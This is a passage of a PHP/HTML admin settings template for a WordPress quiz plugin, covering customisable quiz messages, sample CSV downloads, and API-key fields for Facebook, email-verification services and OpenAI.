						<input type="text" class="form-control" value="<?= isset($fb_share_error_msg) && $fb_share_error_msg != '' ? $fb_share_error_msg: 'Sorry, you need to share on social to see results.' ?>" id="fb_share_error_msg">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Valid Email </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($valid_email) ? $valid_email: 'Please enter a valid email address.' ?>" id="valid_email">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Already Taken Quiz</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($already_taken_quiz) ? $already_taken_quiz: 'You have already taken this quiz. See results below.' ?>" id="already_taken_quiz">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed if users don't get passing mark</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($not_passed_quiz_msg) ? $not_passed_quiz_msg: 'Sorry, you need to pass the quiz to proceed to the next lesson.' ?>" id="not_passed_quiz_msg">
					</div>
				</div>
				
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed to not-logged-in users</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= isset($user_shortcode_not_login) ? $user_shortcode_not_login: 'Sorry you need to be logged-in to view the quiz results' ?>" id="user_shortcode_not_login">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Upload Button Text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($upload_button_text) && $upload_button_text != '') ? $upload_button_text: 'Upload' ?>" id="upload_button_text">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Uploaded Filename Text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($uploaded_filename_text) && $uploaded_filename_text != '') ? $uploaded_filename_text: 'Filename:' ?>" id="uploaded_filename_text">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed on file uploaded</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($file_uploaded_message) && $file_uploaded_message != '') ? $file_uploaded_message: 'File uploaded successfully' ?>" id="file_uploaded_message">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed on file upload failed</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($file_upload_failed_message) && $file_upload_failed_message != '') ? $file_upload_failed_message: 'Sorry, this file extension is not supported.' ?>" id="file_upload_failed_message">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed if file size limit exceeds</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($upload_filesize_limit_exceeds_message) && $file_upload_failed_message != '') ? $upload_filesize_limit_exceeds_message: 'Sorry, this file exceeds the allowed file size limit.' ?>" id="upload_filesize_limit_exceeds_message">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Message to be displayed file upload validation</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($file_upload_validation) && $file_upload_validation != '') ? $file_upload_validation: 'Please upload a file.' ?>" id="file_upload_validation">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Required Field</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($required_field) && $required_field != '') ? $required_field: 'Required field cannot be empty.' ?>" id="required_field">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">GDPR Required Field</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($gdpr_required_field) && $gdpr_required_field != '') ? $gdpr_required_field: 'Please select checkbox.' ?>" id="gdpr_required_field">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Outcome screen 'Your Answer' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($outcome_screen_answer) && $outcome_screen_answer != '') ? $outcome_screen_answer: 'Your Answer:' ?>" id="outcome_screen_answer">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Outcome screen 'Result' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($outcome_screen_result) && $outcome_screen_result != '') ? $outcome_screen_result: 'Your Result:' ?>" id="outcome_screen_result">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Outcome screen 'Correct Answer' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($outcome_screen_correct_answer) && $outcome_screen_correct_answer != '') ? $outcome_screen_correct_answer: 'Correct Answer:' ?>" id="outcome_screen_correct_answer">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Outcome screen 'Incorrect Answer Explanation' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?= (isset($outcome_screen_incorrect_answer) && $outcome_screen_incorrect_answer != '') ? $outcome_screen_incorrect_answer: 'Incorrect Answer Explanation:' ?>" id="outcome_screen_incorrect_answer">
					</div>
				</div> 
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Category 'Total Score' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $category_scoring_text1;?>" id="category_scoring_text1">
					</div>
				</div> 

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Category 'Total Correct Answers' text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $category_assessment_text1;?>" id="category_assessment_text1">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Invalid Date text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $invalid_date_text;?>" id="invalid_date_text">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">PDF Download Success</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $pdf_download_success;?>" id="pdf_download_success">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">PDF Downloading Text</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $pdf_downloading_text;?>" id="pdf_downloading_text">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Voting is Closed</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $voting_closed;?>" id="voting_closed">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Quiz Details</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $quiz_details;?>" id="quiz_details">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">User Details</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $user_details;?>" id="user_details">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">User Answer</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $user_answer;?>" id="user_answer">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Quiz Name</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_quiz_name;?>" id="sqb_quiz_name">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Date</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_date;?>" id="sqb_date">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Retake Count</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $retake_count;?>" id="retake_count">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Time Spent</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $time_spent;?>" id="time_spent">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">GDPR Terms</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $gdpr_terms;?>" id="gdpr_terms">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Quiz Result</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $quiz_result;?>" id="quiz_result">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Outcome</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_outcome;?>" id="sqb_outcome">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Name</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_name;?>" id="sqb_name">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Email</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_email;?>" id="sqb_email">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Student Dashbaord Correct Answer</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $student_correct_answer;?>" id="student_correct_answer">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Points Scored</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $points_scored;?>" id="points_scored">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">File Name</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $file_name;?>" id="file_name">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Incorrect</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $student_incorrect;?>" id="student_incorrect">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Click to download</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $click_to_download;?>" id="click_to_download">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">File Uploaded Successfully</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $file_upload_successfully;?>" id="file_upload_successfully">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">This answer is no longer present in the quiz</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $answer_no_longer;?>" id="answer_no_longer">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Weight</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_weight;?>" id="sqb_weight">
					</div>
				</div>


				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Height</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_height;?>" id="sqb_height">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Certificate</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_certificate;?>" id="sqb_certificate">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Not loggedin</label>
					<div class="fb-tracking_right-content">
						<div class="sqb_tiny_mce_editor" id="not-loggedin-user">
							<?php echo $not_loggedin;?>
						</div>
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Don't want to be listed?</label>
					<div class="fb-tracking_right-content">
						<div class="sqb_tiny_mce_editor" id="dont_want_listed">
							<?php echo stripslashes($dont_want_listed); ?>
						</div>
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Click to Opt-out</label>
					<div class="fb-tracking_right-content">
						<div class="sqb_tiny_mce_editor" id="click_to_optout">
							<?php echo stripslashes($click_to_optout); ?>
						</div>
					</div>
				</div>

				<div class="fb-tracking-content-card" style="display: none;">
					<label for="" class="fb-tracking_label">You need to be logged-in to opt-out</label>
					<div class="fb-tracking_right-content">
						<div class="sqb_tiny_mce_editor" id="logged_in_optout">
							<?php echo stripslashes($logged_in_optout); ?>
						</div>
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Are you sure you don't want to be listed in the leaderboard?</label>
					<div class="fb-tracking_right-content">
						<div class="fb-tracking_right-content">
							<div class="sqb_tiny_mce_editor" id="dont_want_listed_leaderboard">
								<?php echo stripslashes($dont_want_listed_leaderboard); ?>
							</div>
						</div>
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Multiple type question limit reached message</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $limit_exceeded;?>" id="limit_exceeded">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Category Name</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $category_name_customize;?>" id="category_name_customize">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Click to unmute</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $click_to_play;?>" id="click_to_play">
					</div>
				</div>
				
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Score</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $student_score;?>" id="student_score">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Total Score</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_total_points;?>" id="sqb_total_points">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Result</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_result;?>" id="sqb_result">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Category Score</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_score;?>" id="sqb_score">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">High</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_high;?>" id="sqb_high">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Medium</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_medium;?>" id="sqb_medium">
					</div>
				</div>

				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Low</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_low;?>" id="sqb_low">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Please Enter Valid Phone Number</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo $sqb_valid_phonenumber;?>" id="sqb_valid_phonenumber">
					</div>
				</div>
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Logged in admin Message</label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?php echo stripslashes($logged_in_admin_msg);?>" id="logged_in_admin_msg">
					</div>
				</div>
			</div>
		</div>
	</div>

	<div class="quiz-actions justify-content-center">
		<!--a href="javascript:void(0)" class="quiz--btn quiz-prev-btn" onclick="sqb_next_tab('Basic-Settings')"> Previous </a-->
		<!--a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_quiz('Restriction-Settings')"> Save </a-->
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn"  onclick="sqb_save_quiz_setting()"> Save </a>
		<!--a href="javascript:void(0)" class="quiz--btn quiz-next-btn" onclick="sqb_next_tab('Display-Settings')"> Next </a-->
	</div>

</div>	
<!-- <div class="tab-pane fade " id="settings_notifications_tab" role="tabpanel" aria-labelledby="settings_notifications_tab">
	<?php // include_once('sqb_notifications.php'); ?>
</div>	 -->

<!-----csv import starts------>

<div class="tab-pane fade sqb_import_csv_tab" id="settings_import_tab" role="tabpanel" aria-labelledby="settings_import_tab">
	<?php include_once('sqb_export_import.php'); ?>
</div>	

<div class="modal quiz-popup-style fade" id="download-sample-csv" tabindex="-1" role="dialog" aria-labelledby="add-country-popupLabel" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="">Download Sample CSV</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			</div>
			<div class="modal-body">
				<p>Personality Quiz Type: <a class="sqb_download_sample_csv" href="javascript:void(0);" data-id="sample_csv" data-url="<?php echo plugins_url(); ?>/smartquizbuilder/includes/samplecsv/SQB_PersonalitySampleQuestionAnswers.csv">Download</a></p>
				<p>Assessment Quiz Type: <a class="sqb_download_sample_csv" href="javascript:void(0);" data-id="sample_csv" data-url="<?php echo plugins_url(); ?>/smartquizbuilder/includes/samplecsv/SQB_AssessmentSampleQuestionAnswers.csv">Download</a></p>
				<p>Scoring Quiz Type: <a class="sqb_download_sample_csv" href="javascript:void(0);" data-id="sample_csv" data-url="<?php echo plugins_url(); ?>/smartquizbuilder/includes/samplecsv/SQB_ScoringSampleQuestionAnswers.csv">Download</a></p>
				<p>Survey Quiz Type: <a class="sqb_download_sample_csv" href="javascript:void(0);" data-id="sample_csv" data-url="<?php echo plugins_url(); ?>/smartquizbuilder/includes/samplecsv/SQB_SurveySampleQuestionAnswers.csv">Download</a></p>
			</div>
		</div>
	</div>
</div>


<!-----csv import ends------>

<div class="tab-pane fade <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'student_shortcode')){ echo ' show active'; }?>" id="student_shortcode_tab" role="tabpanel" aria-labelledby="student_shortcode_tab">
	<?php include_once('sqb_student_shortcode.php'); ?>
</div>	

<div class="tab-pane fade <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'sqb_gdpr')){ echo ' show active'; }?>" id="sqb_gdpr" role="tabpanel" aria-labelledby="sqb_gdpr">
	<?php include_once('sqb_gdpr.php'); ?>
</div>	

<div class="tab-pane fade" id="settings_external_integration_tab" role="tabpanel" aria-labelledby="settings_external_integration_tab">
	<h3 class="quiz--title quiz_settings_head pb-0"><i class="fa fa-cog" aria-hidden="true"></i> Facebook Integration</h3>
	<h3 class="quiz--title quiz_settings_head1 pb-0" style="display:none"><i class="fa fa-cog" aria-hidden="true"></i><div class="smalltext_outer" >Email Verification
		<small style="color:#555;font-size: 15px;padding: 12px 0px;margin: 0;display: inline-block;width: 100%;vertical-align: top;line-height: 18px;">SQB integrates with QuickEmailVerification.com and reoon.com to validate the emails entered by users.</small></div></h3>

	<ul class="nav nav-tabs email-verification-tab" id="Quiz-reportsTab" role="tablist">
		<li class="nav-item">
			<a class="nav-link active show" onclick="quiz_change_text('external_int','Facebook Integration');"  data-toggle="tab" href="#dap_admin_notification_tab1"  role="tab" aria-controls="dap_admin_notification_tab1" aria-selected="false">Facebook Integration</a>
		</li>
		<li class="nav-item">
			<a class="nav-link"  onclick="quiz_change_text('external_int','Quick Email Verification');" data-toggle="tab" href="#dap_admin_notification_tab2" role="tab" aria-controls="dap_admin_notification_tab2" aria-selected="false">Email Verification</a>
		</li>	
		<li class="nav-item">
			<a class="nav-link"  onclick="quiz_change_text('external_int','Chat GPT Integration');" data-toggle="tab" href="#dap_admin_notification_tab3" role="tab" aria-controls="dap_admin_notification_tab3" aria-selected="false"> OpenAI Integration</a>
		</li>		
	</ul>

<div class="tab-content " id="reports-tab-content1">
	<div class="tab-pane fade active show" id="dap_admin_notification_tab1" role="tabpanel" aria-labelledby="dap_admin_notification_tab1">	
		<div class="fb-tracking-gray-outer">
			<div class="fb-tracking-content-card border-bottom-0">
				<label for="" class="fb-tracking_label">Enter Facebook API Key 
					<div class="tool-tip">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc">If you want to add a Facebook share button to allow users to share their results on Facebook, you'll have to first create a FB app for your domain and enter the API key here</div>
									</div> <a class="btn" id="view_video" href="https://www.youtube.com/embed/i_oKpN3eO9A" target="_blank" style="margin-left:40px;">Watch video for details</a></label>
				<div class="fb-tracking_right-content">
					<?php 
					$name = 'facebook';
					$key = 'fb_api_key';
					$fb_api_key = '';
					$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
					if($obj){
						$fb_api_key = $obj->getValue();
					}
					
					?>
					<input type="text" name="fb_api_key" id="fb_api_key" value="<?php echo $fb_api_key;?>" class="form-control">
					<div class="fb-tracking-actions">
						<a href="javascript:void(0)" class="fb-tracking--btn fb-tracking-save-btn sqb_save_facebook_api_key_btn" onclick="sqb_save_facebook_api_key()"> Save </a>
					</div>
					
				</div>
			</div>	
		</div>

	</div>
	<div class="tab-pane fade " id="dap_admin_notification_tab2" role="tabpanel" aria-labelledby="dap_admin_notification_tab2">
	
	<?php 

	$evp = get_option('email_verify_platform', 'quickemail');

	?>

<div class="external-platforms-wrapper">
	<div class="fb-tracking-gray-outer">
		<div class="fb-tracking-content-card border-bottom-0">
			<div class="quiz-content-card">
				<label for="" class="quiz_label">Email verification platform</label>
				<div class="quiz_right-content">
					<label class="radio-btn--outer"><input type="radio" name="email_verify_platform" value="quickemail" <?php echo ($evp == 'quickemail') ? 'checked' : ''; ?>>Quick Email Verification</label>
					<label class="radio-btn--outer"><input type="radio" name="email_verify_platform" value="reoon" <?php echo ($evp == 'reoon') ? 'checked' : ''; ?>>Reoon</label>
				</div>
			</div>
		</div>
	</div>
			

	<div class="fb-tracking-gray-outer qev-quickemail" <?php echo ($evp == 'quickemail') ? '' : 'style="display:none"'; ?>>
		<h3>Quick Email Verification</h3>
		<div class="fb-tracking-content-card border-bottom-0">
			<label class="fb-tracking_label">Enter API Key</label>
			<div class="fb-tracking_right-content">
				<?php 
				$quick_email_verification = 'quick_email_verification';
				$quick_email_verification_api_key = 'quick_email_verification_api_key';
				$qev_api_key = '';
				$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($quick_email_verification , $quick_email_verification_api_key);
				if($obj){
					$qev_api_key = $obj->getValue();
				}
				?>
				
				<input class="form-control" type="text" name="qev_api_key" id="qev_api_key" value="<?php echo $qev_api_key;?>">
			</div>
		</div>
		<div class="fb-tracking-content-card border-bottom-0">
			<div class="fb-tracking_right-content">
				<label for="" class="fb-tracking_label">Email Verification Timeout (seconds)</label>
				<div class="fb-tracking_right-content">
					<?php 
					$email_verification_timeout = 'email_verification_timeout';
					$email_verification_timeout_value = 'email_verification_timeout_value';
					$qev_timeout = '';
					$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($email_verification_timeout , $email_verification_timeout_value);
					if($obj){
						$qev_timeout = $obj->getValue();
					}
					
					?>
					
					<input class="form-control" type="text" name="qev_timeout" id="qev_timeout" value="<?php if($qev_timeout != ''){ echo $qev_timeout; } else { echo 11; }?>">
				</div>
			</div>
		</div>
	</div>


	<div class="fb-tracking-gray-outer qev-reoon" <?php echo ($evp == 'reoon') ? '' : 'style="display:none"'; ?>>
		<h3>Reoon</h3>
		<div class="fb-tracking-content-card border-bottom-0">
			<label class="fb-tracking_label">Enter API Key</label>
			<div class="fb-tracking_right-content">
				<?php 
				$reoon_verification = 'reoon_verification';
				$reoon_api_key = 'reoon_verification_api_key';
				$qev_api_key = '';
				$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($reoon_verification , $reoon_api_key);
				if($obj){
					$reoon_api_key = $obj->getValue();
				}
				?>
				
				<input class="form-control" type="text" name="reoon_api_key" id="reoon_api_key" value="<?php echo get_option('reoon_api_key', '');?>">
			</div>
		</div>
		
	</div>

</div>
	<div class="quiz-actions justify-content-center">
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn sqb_save_quick_email_verification_api_key_btn" onclick="sqb_save_quick_email_verification_api_key()"> Save </a>
		</div>
	</div>

	<div class="tab-pane " id="dap_admin_notification_tab3" role="tabpanel" aria-labelledby="dap_admin_notification_tab1">	

		<?php if(!defined('APQ_FILE')){ 
			?>
			<div class="mt-3 sqb-alert sqb-alert-danger">
						<p>Sorry this feature requires another plugin - AI Powered Quiz. It'll allow you to automatically create quizzes using AI. It's a paid add-on.</p>
						<p>If you have not purchased this plugin, you can purchase it here.</p>

						
					</div>
					<div class="aiq-settings-pricing-plan-btn">
							<a class="chatgpt-btn btn-pricing-plan" href="https://smartquizbuilder.com/ai" target="_blank">SQB AI Add-On</a>
							
						</div>
					<?php
			}else{ ?>

		<div class="fb-tracking-gray-outer ai-api-main-wrapper">
			<div class="fb-tracking-content-card border-bottom-0">
				<label for="" class="fb-tracking_label">OpenAI API Key 
					<?php /*<div class="tool-tip">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc"></div>
									</div>*/ ?></label> 
				<div class="fb-tracking_right-content">
					<?php $chatgpt_api_key = get_option('sqb_chat_gpt_api_key', ''); ?>
					
					<input type="text" name="chatgpt_api_key" id="chatgpt_api_key" value="<?php echo $chatgpt_api_key;?>" class="form-control">
					<?php
					$arr = array(
						'gpt-4o' => 'GPT-4o (Cheaper and faster than GPT-4 Turbo)',
						'gpt-4o-mini' => 'GPT-4o-mini (Cheaper and faster than gpt-3.5-turbo)',
						'gpt-3.5-turbo-16k' => 'gpt-3.5-turbo-16k (deprecated)',
						'gpt-3.5-turbo' => 'gpt-3.5-turbo (deprecated)'
					);
					$openaiModel = get_option('sqb_chat_gpt_api_model', '');
					?>
					<label for="" class="quiz_label">Select Model</label>
					<div class="quiz-content-card">
						<div class="quiz_right-content">
							<select class="" id="openai-model">
								<?php foreach ($arr as $key => $a) { ?>
									<option value="<?php echo $key ?>" <?php echo ($openaiModel == $key) ? 'selected': ''; ?>><?php echo $a ?></option>
								<?php } ?>
							</select>
						</div>
					</div>
					<div class="fb-tracking-actions">
						<a href="javascript:void(0)" class="fb-tracking--btn fb-tracking-save-btn sqb_save_facebook_api_key_btn" onclick="sqb_save_chatgpt_api_key()"> Save </a>
					</div>
					<div class="save-quiz-ai-outer" style="display: none;">
						<div class="save-quiz-ai">Saved Successfully! You can now create new quizzes using AI.</div>
						<div class="create-quiz-page"><a href="<?php echo site_url(); ?>/wp-admin/admin.php?page=sqb_add_quiz&tab=OpenAI">Click to return</a> to Create Quiz page.</div>
					</div>
				</div>
			</div>	
		</div>

	<?php } ?>

	</div>
</div>	
	
	
	
	
	

</div>	

<div class="tab-pane fade <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'dap_course')){ echo ' show active'; }?>    " id="settings_dap_course_integration_tab" role="tabpanel" aria-labelledby="settings_dap_course_integration_tab">
	<?php  
	
	if(sqb_check_dap_exists() && function_exists('dap_livelinks_activate')){
		include_once('sqb_dap_integration.php');
	}
	
	
	?>
</div>

<div class="tab-pane fade  <?php if(!isset($_GET['tab'])){ echo '  show active '; }?> " id="settings_advance_tab" role="tabpanel" aria-labelledby="settings_advance">
	<?php 
	$current_version_plugin = rand(10,10000);
	//wp_enqueue_script("sqb_sortable_jquery_ui", "//cdnjs.cloudflare.com/ajax/libs/popper.js/2.4.3/cjs/popper.min.js", array('jquery')); 
	wp_enqueue_script("sqb_quiz_settings_tab_js",plugin_dir_url(__FILE__)."../js/sqb_quiz_settings_tab.js", false, $current_version_plugin );
	
	?>
	<h3 class="quiz--title quiz_settings_head pb-0"><i class="fa fa-cog" aria-hidden="true"></i> Quiz Settings</h3> 
	<ul class="nav nav-tabs global-settings-tab" id="Quiz_setting_tab" role="tablist">


		<li class="nav-item">
			<a class="nav-link <?php if(!isset($_GET['inner_tab'])){ echo ' active'; }?> "  onclick="quiz_change_text('advanced','Quiz Settings');"  data-toggle="tab" href="#Quiz_setting_tab_1" role="tab" aria-controls="Quiz_setting_tab_1" aria-selected="true">Quiz Settings</a>
		</li>
		
		
		<li class="nav-item">
			<a class="nav-link "  onclick="quiz_change_text('advanced','PDF Report');"  data-toggle="tab" href="#Quiz_setting_tab_6" role="tab" aria-controls="Quiz_setting_tab_6" aria-selected="true">PDF Report</a>
		</li>
		
		<li class="nav-item">
			<a class="nav-link " onclick="quiz_change_text('advanced','Quiz Category');"  data-toggle="tab" href="#Quiz_setting_tab_2" role="tab" aria-controls="Quiz_setting_tab_2" aria-selected="false"> Quiz Category</a>
		</li>
		<li class="nav-item">
			<a class="nav-link " onclick="quiz_change_text('advanced','Global Settings');"  data-toggle="tab" href="#Quiz_setting_tab_3" role="tab" aria-controls="Quiz_setting_tab_3" aria-selected="false"> Global Settings</a>
		</li>
		<li class="nav-item ">
			<a class="nav-link sqb_custom_fields_section <?php if(isset($_GET['inner_tab']) && ($_GET['inner_tab'] == 'custom_field')){ echo ' active'; }?> " onclick="quiz_change_text('advanced','Custom Fields');"  data-toggle="tab" href="#Quiz_setting_tab_4" role="tab" aria-controls="Quiz_setting_tab_4" aria-selected="false"> Custom Fields</a>
		</li>
		<li class="nav-item ">
			<a class="nav-link sqb_tags_content_section <?php if(isset($_GET['inner_tab']) && ($_GET['inner_tab'] == 'tags_tab')){ echo ' active'; }?> " onclick="quiz_change_text('advanced','Tags Content');"  data-toggle="tab" href="#Quiz_setting_tab_5" role="tab" aria-controls="Quiz_setting_tab_5" aria-selected="false"> TAG Content</a>
		</li>
		<li class="nav-item">
